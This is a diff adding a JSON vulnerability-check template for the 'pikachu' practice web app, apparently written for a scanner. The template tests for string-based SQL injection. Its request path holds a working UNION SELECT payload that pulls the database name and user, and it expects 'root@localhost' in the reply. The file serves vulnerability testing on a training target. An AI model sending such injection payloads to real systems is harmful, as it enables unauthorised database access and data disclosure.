@@ -1,0 +1,26 @@
+{
+    "name": "pikachu",
+    "vuln": "字符型sql注入",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/sqli/sqli_str.php?name=x%27+union+select+database%28%29%2Cuser%28%29%23&submit=查询",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "[+] 存在字符型sql注入",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "root@localhost"
+            }
+        }
+    }
+}
